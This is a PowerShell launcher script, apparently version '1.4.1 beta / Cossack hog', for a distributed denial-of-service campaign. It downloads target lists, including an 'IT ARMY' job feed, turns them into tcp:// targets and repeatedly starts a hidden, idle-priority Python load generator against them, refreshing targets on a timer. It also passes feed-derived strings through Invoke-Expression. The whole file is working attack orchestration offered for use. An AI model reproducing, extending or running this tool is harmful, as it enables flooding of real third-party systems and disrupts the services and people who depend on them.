function CreateTargetList([bool] $RunningLite) {
    # Adding targets from simple lists.
    [xml]$XMLConfig = Get-Content -Path ("$PSScriptRoot\\settings.xml");
    $Targets = @();
    $TargetLists = $XMLConfig.config.targets.targetlist.entry;
    foreach ($TargetList in $TargetLists) {
        $TempFilePath = $PSScriptRoot + "\\temp.txt";
        Get-File $TargetList $TempFilePath;
        $Targets += [System.IO.File]::ReadAllLines("$TempFilePath");
        Remove-Item -Force -Path $TempFilePath | Out-Null;
    }
    # Adding targets from IT ARMY
    $ItArmyJSON = $XMLConfig.config.targets.json.itarmy.link;
    $GotJSON = $false
    do {
        #Read the docs before asking questions. Name is intentional.
        $JsonData = Invoke-RestMethod -Uri $ItArmyJSON -Method Get -TimeoutSec 5;
        if ($null -eq $JsonData.jobs) {
            Out-Null;
        }
        else {
            $GotJSON = $true;
        }
    } while ($GotJSON = $false)
    $Jobs = $JsonData.jobs;
    foreach ($Job in $Jobs) {
        $Paths = $XMLConfig.config.targets.json.itarmy.path.entry;
        foreach ($Path in $Paths) {
            $SafePath = $Path -replace '(`)*\$', '$1$1`$$';
            # Generally iex should be avoided. THIS is a rare exception.
            $Val = Invoke-Expression "`$Job.$SafePath"
            if ($null -eq $Val) {
                Out-Null;
            }
            else {
                $Targets += "tcp://$Val";
            }
        }
    }

    # Cleanup
    $Targets = $Targets -join " ";
    $Targets = $Targets -replace '`n', ' ';
    $Targets = $Targets -replace '`r', ' ';
    $Targets = $Targets -replace '`t', ' ';
    $Targets = $Targets -replace ',', ' ';
    $Targets = $Targets -replace '  ', ' ';
    $Targets = $Targets.Replace("tcp)", "tcp");
    $Targets = $Targets -split " ";
    if (-not $RunningLite) {
        $TargetsCleaned = $Targets | Select-Object -Unique | Sort-Object;
    }
    else {
        $TargetsCleaned = $Targets | Select-Object -Unique | Sort-Object { Get-Random };
    }
    return $TargetsCleaned
}

$host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
$host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green

[xml]$XMLConfig = Get-Content -Path ("$PSScriptRoot\\settings.xml");
$ActionPreference = $XMLConfig.config.erroraction;
$ErrorActionPreference = $ActionPreference;
$ProgressPreference = $ActionPreference;
$WarningPreference = $ActionPreference;
[string] $SystemDrive = $(Get-CimInstance Win32_OperatingSystem | Select-Object SystemDirectory).SystemDirectory;
$SystemDrive = $SystemDrive.Substring(0, 2);
$InstallFolder = $XMLConfig.config.folders.install;
$RootDir = $SystemDrive + "\" + $InstallFolder;
Set-Location $RootDir;
. $("$RootDir\\functions.ps1");

#[console]::TreatControlCAsInput = $true

$PythonPath = $("$RootDir\$($XMLConfig.config.folders.python)\");
$PythonExe = $PythonPath + "python.exe";
$LoadPath = $("$RootDir\$($XMLConfig.config.folders.load)\");
$LoadFileName = $LoadPath + $($XMLConfig.config.mainloadfile);
# Seems to be needed on certain configurations.
$BogusInitPyPath = $LoadPath + "src\__init__.py";
if (Test-Path $BogusInitPyPath) {
    Remove-Item $BogusInitPyPath -Force | Out-Null;
}
$LiteBlockSize = [Int] $XMLConfig.config.liteblocksize;
$MinutesPerBlock = $XMLConfig.config.timers.minutesperblock;
# DO NOT DO THAT and do not propose that! Anyway this shall not work.
#[Sytem.Environment]::SetEnvironmentVariable('PYTHONPATH', $("$PythonPath; $LoadPath"), [System.EnvironmentVariableTarget]::Process);
#[System.Environment]::SetEnvironmentVariable('PYTHONHOME', $PythonPath, [System.EnvironmentVariableTarget]::Process);


$RunnerVersion = "1.4.1 beta / Cossack hog";

if ($args -like "*-lite*") {
    $RunningLite = $true;
}
else {
    $RunningLite = $false;
}

Stop-Runners $LoadPath $PythonExe;

$TargetList = @()
do {
    $TargetList = CreateTargetList $RunningLite;
} while ($TargetList.Count -le 0)
$TargetsUpdated = [System.DateTime]::Now;
$StopRequested = $false;
$StartTask = $true;
$Targets = @()
$Globalargs = $XMLConfig.config.baseloadargs;
Set-Location $LoadPath;


while (-not $StopRequested) {
    Clear-Host;
    $BannerURL = $XMLConfig.config.links.banner;
    $Banner = Get-Banner $BannerURL;
    Write-Host $Banner;
    $StartupMessage = "$($XMLConfig.config.messages.runnerstart) $RunnerVersion";
    if ($RunningLite) {
        $StartupMessage = $StartupMessage + " Lite";
    }
    Write-Host $StartupMessage;
    Write-Host "$($XMLConfig.config.messages.presstoexit)"
    Set-Location $RootDir;
    Write-Host "$($XMLConfig.config.messages.everythingfine)"

    if ($StartTask -and (-not $RunningLite)) {
        $TargetList -join "`r`n" | Out-File -Encoding UTF8 -FilePath "$LoadPath\targets.txt" -Force | Out-Null;
        $TargetString = $("-c $LoadPath\targets.txt");
        $RunnerArgs = $("$LoadFileName $Globalargs $TargetString");
        $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $LoadPath -WindowStyle Hidden -ArgumentList $RunnerArgs -PassThru;
        $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
        $StartTask = $false;
    }

    if ($StartTask -and $RunningLite) {
        $Targets = Get-SlicedArray $TargetList $LiteBlockSize;
        foreach ($Target in $Targets) {
            if ($Target.Count -gt 0) {
                $TargetString = $Target -join ' ';
                $RunnerArgs = $("$LoadFileName $Globalargs -t $LiteBlockSize $TargetString");
                $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $LoadPath -WindowStyle Hidden -ArgumentList $RunnerArgs -PassThru;
                $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
                $EndJob = [System.DateTime]::Now.AddMinutes($MinutesPerBlock);
                $TillEnd = New-Timespan $([System.DateTime]::Now) $EndJob
                while (($PyProcess.HasExited -eq $false) -and ($TillEnd -gt 0)) {
                    $Message = $XMLConfig.config.messages.targets + `
                        ": $($Target.Count) " + `
                        $XMLConfig.config.messages.targetsupdated + `
                        ": $(Get-HHMM $TargetsUpdated)" + " " + `
                        $XMLConfig.config.messages.tillupdate + `
                        ": $([int] $TillEnd.Minutes) " + `
                        $XMLConfig.config.messages.minutes;
                    Clear-Line $Message;
                    Start-Sleep -Seconds 5;
                    $TillEnd = New-Timespan $([System.DateTime]::Now) $EndJob;
                }
                Stop-Tree $PyProcess.Id;
            }
        }
        $StartTask = $false;
    }
    if (!$RunningLite) {
        $EndJob = [System.DateTime]::Now.AddMinutes($MinutesPerBlock);
        $TillEnd = New-Timespan $([System.DateTime]::Now) $EndJob;
        while ($TillEnd -gt 0) {
            if ($PyProcess.HasExited -eq $true) {
                $StartTask = $true;
                break;
            }
            $Message = $XMLConfig.config.messages.targets + `
                ": $($TargetList.Count) " + `
                $XMLConfig.config.messages.targetsupdated + `
                ": $(Get-HHMM $TargetsUpdated)" + " " + `
                $XMLConfig.config.messages.tillupdate + `
                ": $([int] $TillEnd.Minutes) " + `
                $XMLConfig.config.messages.minutes;
            Clear-Line $Message;
            $TillEnd = New-Timespan $([System.DateTime]::Now) $EndJob;
            Start-Sleep -Seconds 1;
        }
        $Message = $XMLConfig.config.messages.gettingtargets;
        Clear-Line $Message;
        $NewTargetList = CreateTargetList $RunningLite;
        if ($TargetList.Count -eq $NewTargetList.Count) {
            $StartTask = $false;
        }
        else {
            $TargetList = $NewTargetList;
            $TargetsUpdated = [System.DateTime]::Now;
            Stop-Runners $LoadPath $PythonExe;
            $StartTask = $true;
        }
    }

    if ($RunningLite) {
        $Message = $XMLConfig.config.messages.gettingtargets;
        Clear-Line $Message;
        $TargetList = CreateTargetList $RunningLite;
        $TargetsUpdated = [System.DateTime]::Now;
        Stop-Runners $LoadPath $PythonExe;
    }
}